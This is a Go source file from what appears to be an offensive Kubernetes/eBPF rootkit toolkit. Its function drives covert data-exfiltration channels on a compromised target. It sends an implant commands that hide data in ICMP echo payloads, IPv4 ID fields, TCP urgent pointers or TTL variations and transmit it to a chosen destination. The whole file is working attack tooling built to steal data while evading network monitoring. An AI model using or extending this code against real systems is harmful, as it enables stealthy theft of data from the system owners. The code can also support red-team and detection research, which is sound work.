package covert_chan

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type ChannelResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, chanType, dest, data, output string) error {
	result := &ChannelResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch chanType {
	case "icmp":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_xdp_icmp", "attach XDP program to craft ICMP echo replies with encoded payload", "covert_icmp_attach"},
			{"encode_payload", "split data into ICMP payload chunks with sequence numbering", "covert_icmp_encode"},
			{"start_exfil", "begin transmitting encoded data via ICMP echo request/reply pairs", "covert_icmp_start"},
		}
	case "ipid":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_tc_egress", "attach TC egress to modify IPv4 Identification field", "covert_ipid_attach"},
			{"configure_encoding", "set 16-bit encoding scheme using IP ID field as carrier", "covert_ipid_config"},
			{"start_channel", "begin encoding data in IP ID field of outgoing packets", "covert_ipid_start"},
		}
	case "urgent":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"hook_tcp_sendmsg", "hook tcp_sendmsg to set URG flag and urgent pointer", "covert_urg_hook"},
			{"encode_urgent", "encode data bytes in TCP urgent pointer field (16-bit channel)", "covert_urg_encode"},
			{"start_channel", "begin sending data via TCP urgent pointer on existing connections", "covert_urg_start"},
		}
	default: // ttl
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_tc_egress", "attach TC program to manipulate IP TTL field", "covert_ttl_attach"},
			{"configure_encoding", "map data bits to TTL decrements (normal variation range)", "covert_ttl_config"},
			{"start_channel", "begin encoding data in TTL field variations of outgoing packets", "covert_ttl_start"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + chanType + "#" + dest + "#" + data
		status := shared.SendCommand(target, "/covert_channel", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	d, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, d, 0644)
	}
	fmt.Println(string(d))
	return nil
}
